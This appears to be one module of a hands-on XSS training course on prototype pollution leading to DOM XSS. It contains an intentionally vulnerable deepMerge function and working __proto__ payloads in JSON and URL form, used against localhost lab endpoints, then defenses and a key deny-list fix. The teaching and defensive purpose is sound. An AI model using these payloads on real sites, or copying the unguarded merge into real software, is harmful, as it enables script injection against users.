Module 14 — Prototype Pollution → DOM XSS HARD

XSS Mastery Course · Module 14 of 19

1. The Core Insight

Every JavaScript object you create — {}, new Foo(), an array — inherits from Object.prototype. When you access a property that doesn't exist on the object itself, the engine walks the prototype chain and finds it on Object.prototype instead.

Prototype pollution is the act of writing to Object.prototype (or another built-in prototype) via an application vulnerability, so that every subsequently created object in the runtime inherits the attacker's value.

// Normal object — no innerHTML
const obj = {};
console.log(obj.innerHTML); // undefined

// After prototype pollution:
Object.prototype.innerHTML = '<img src=x onerror=alert(1)>';
const obj2 = {};
console.log(obj2.innerHTML); // "<img src=x onerror=alert(1)>"  ← attacker value!

On its own, pollution is a denial-of-service or logic-corruption issue. It becomes XSS when application code reads the polluted property into a DOM sink like innerHTML, eval, or document.write.

Why this is subtle: There is no direct path from user input to a DOM sink in the code. The sink reads from a config object that the developer assumes is always empty or typed. The attacker's value arrives via a completely different code path — the deep-merge utility.

2. JavaScript's Prototype Chain

When you write obj.prop, the engine performs this lookup:

obj.prop
  → not found → obj.__proto__.prop       (the object's own prototype)
  → not found → obj.__proto__.__proto__.prop  (Object.prototype)
  → not found → undefined

Three ways to write to Object.prototype:

MethodCodeNotes
DirectObject.prototype.x = vExplicit — rarely in user-visible code
Via __proto__obj.__proto__.x = vClassic pollution vector
Via constructorobj.constructor.prototype.x = vWorks when __proto__ is blocked

3. The Vulnerable Pattern: deepMerge

Prototype pollution almost always enters through a recursive object merge function — used everywhere in JavaScript for merging config objects, extending defaults, or parsing URL parameters into nested objects.

Vulnerable deepMerge

function deepMerge(target, source) {
  for (const key in source) {
    if (typeof source[key] === 'object' && source[key] !== null) {
      target[key] = target[key] || {};
      deepMerge(target[key], source[key]);   // ← recursion
    } else {
      target[key] = source[key];
    }
  }
  return target;
}

// Attacker input:
const malicious = JSON.parse('{"__proto__":{"innerHTML":"<img src=x onerror=alert(1)>"}}');
deepMerge({}, malicious);
// Now: Object.prototype.innerHTML === "<img src=x onerror=alert(1)>"

The bug: for (const key in source) iterates over inherited properties too (in older patterns) or the code explicitly assigns to target["__proto__"], which in JavaScript writes to Object.prototype, not to the object's own __proto__ key.

URL parameter vector

Many apps parse URL query strings into nested objects:

// URL: ?__proto__[innerHTML]=<img src=x onerror=alert(1)>
// Parsed into:
{ "__proto__": { "innerHTML": "<img src=x onerror=alert(1)>" } }
// → deepMerge({}, parsed) → prototype polluted

4. The Attack Chain: Source → Pollution → Sink

The full attack has two independent code paths that meet in the polluted prototype:

┌─────────────────────────────────────────────────────────┐
│ SOURCE (user-controlled)                                │
│   URL param → parseQuery() → deepMerge()               │
│                         ↓                               │
│              Object.prototype.innerHTML = PAYLOAD       │
└─────────────────────────────────────────────────────────┘
                           ↓  (prototype chain)
┌─────────────────────────────────────────────────────────┐
│ SINK (unrelated code path)                              │
│   const config = {};                                    │
│   if (config.innerHTML !== undefined) {                 │
│     someElement.innerHTML = config.innerHTML;  ← XSS  │
│   }                                                     │
└─────────────────────────────────────────────────────────┘
Why static analysis misses this: No taint path connects the source to the sink in the same function or call chain. The connection is invisible — it runs through global state (Object.prototype).

5. Lab Exercises

The lab server at http://localhost:5000 exposes four endpoints, each demonstrating a different prototype pollution gadget:

EndpointGadget TypeAttack URL
/pp/merge Deep merge via URL params ?__proto__[innerHTML]=<img src=x onerror=alert(1)>
/pp/config JSON config merge ?settings={"__proto__":{"innerHTML":"<img src=x onerror=alert(1)>"}}
/pp/template Template engine gadget ?__proto__[extraHtml]=<img src=x onerror=alert(1)>
/pp/gadget jQuery-like library gadget ?__proto__[html]=<img src=x onerror=alert(1)>
  1. Start the server: make py or make node
  2. Visit /pp/merge without any params. Observe the "proto-check" output — new {}.innerHTML is undefined.
  3. Add ?__proto__[innerHTML]=POLLUTED to the URL. Observe proto-check now shows "POLLUTED" — every new object in the runtime inherits it.
  4. Add the XSS payload: ?__proto__[innerHTML]=<img src=x onerror=alert(document.domain)>. The gadget fires.
  5. Repeat for /pp/template using __proto__[extraHtml] — this one fires inside the template renderer.
  6. Try /pp/gadget with __proto__[html] — the jQuery-like helper reads the polluted option.

Also open attack_11_proto.html for a standalone interactive demo that walks through each gadget without needing the server.

In every case, the fix was to add a property key check before recursive merge:

// Safe deepMerge — reject prototype-polluting keys
if (key === '__proto__' || key === 'constructor' || key === 'prototype') continue;

7. Defenses

DefenseHow it helpsLimits
Key deny-list in merge Skip __proto__, constructor, prototype during deep merge Must catch all three; constructor.prototype is an alternate path
Object.create(null) Creates an object with no prototype — pollution has no effect because there is no shared chain Only for the object that holds untrusted data
Object.freeze(Object.prototype) Makes Object.prototype immutable — no writes succeed Can break libraries that legitimately extend prototypes
hasOwnProperty checks Replace obj.prop with Object.prototype.hasOwnProperty.call(obj,'prop') Must be applied at every sink, not just the merge
Trusted Types Blocks raw string assignment to innerHTML even if polluted Coverage depends on enforcement scope

8. Key Takeaways

  • Prototype pollution is a second-order vulnerability — the injection and the execution are in different code paths. This makes it invisible to most auditing approaches.
  • The attack surface is every app that merges untrusted objects — URL params, JSON body, WebSocket messages.
  • Gadgets are everywhere: any code that reads a property from an object it doesn't fully control, and routes that value to a DOM sink, is a gadget.
  • As a defender, the root fix is the merge function. As an auditor, search for merge utilities + DOM sinks as independent findings that combine into a chain.
